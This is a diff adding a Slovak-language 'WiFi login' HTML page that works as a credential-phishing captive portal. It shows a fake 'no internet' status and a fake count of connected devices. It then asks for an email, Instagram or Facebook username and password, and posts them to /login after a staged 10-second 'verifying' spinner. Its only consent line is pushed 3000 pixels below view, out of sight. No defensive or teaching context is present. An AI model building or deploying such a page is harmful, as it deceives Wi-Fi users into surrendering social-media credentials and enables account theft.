@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="sk">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>WiFi Prihlásenie</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #f2f2f2;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+    }
+
+    .content {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      width: 100%;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+
+    .box, .loading {
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+      text-align: center;
+      width: 300px;
+      display: none;
+    }
+
+    .box.active, .loading.active {
+      display: block;
+    }
+
+    input {
+      width: 90%;
+      margin: 10px 0;
+      padding: 10px;
+    }
+
+    button {
+      background: #007bff;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    .spinner {
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #007bff;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .spacer {
+      height: 3000px; /* priestor pre skrolovanie */
+    }
+
+    .br {
+      margin-top: 3000px;
+    }
+
+  </style>
+</head>
+<body>
+
+  <div class="content">
+    <div class="box active" id="formBox">
+      <h2>WiFi prihlásenie</h2>
+      <h3>Stav: Bez internetu</h3>
+      <h4 style="color: green">Pripojené zariadenia s internetom: 8</h4>
+      <form id="loginForm" method="POST" action="/login">
+        <input type="text" name="username" placeholder="Email, instagram alebo facebook" required>
+        <input type="password" name="password" placeholder="Heslo" required>
+        <button type="submit">Prihlásiť sa</button>
+      </form>
+    </div>
+
+    <div class="loading" id="loadingBox">
+      <div class="spinner"></div>
+      <p>Overovanie údajov...</p>
+      <p>Ak to trvá príliš dlho, skontrolujte prihlasovacie údaje</p>
+    </div>
+  </div>
+  <div class="br">Odkliknutím tlačidla suhlasite s podmienkami<div/>
+
+  <script>
+    const form = document.getElementById('loginForm');
+    const formBox = document.getElementById('formBox');
+    const loadingBox = document.getElementById('loadingBox');
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault(); // Zastaví okamžité odoslanie
+
+      formBox.classList.remove('active');
+      loadingBox.classList.add('active');
+
+      setTimeout(() => {
+        form.submit(); // Odošle formulár po 10 sekundách
+      }, 10000);
+    });
+  </script>
+
+</body>
+</html>
